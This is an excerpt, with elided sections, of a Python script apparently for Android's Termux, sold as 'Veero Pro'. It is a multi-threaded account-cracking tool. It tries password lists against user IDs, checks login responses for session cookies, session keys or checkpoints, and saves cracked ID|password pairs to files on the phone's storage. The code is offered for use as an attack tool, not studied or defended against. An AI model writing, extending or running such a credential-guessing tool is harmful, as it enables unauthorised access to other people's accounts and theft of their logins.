...
----------------------------------------------
 ...
 Version   : 1.0.0
----------------------------------------------
 Veero Pro version 1.0.0
 Dad Of All: Name Tho Suna Hoga Veero Dada
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi Veero Sir, I Need To Buy Your Paid Veero PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Veero.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def bd():
                ...
                with tred(max_workers=30) as Veero:     
                        ...
                        for psx in user:
                                ...
                                Veero.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Veero=session.cookies.get_dict().keys()
                        if "c_user" in Veero:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Veero:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [VEERO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEERO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [VEERO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEERO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/VEERO-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [VEERO-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/VEERO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [VEERO-OK] '+uid+' | '+pas+'\033[1;97m')
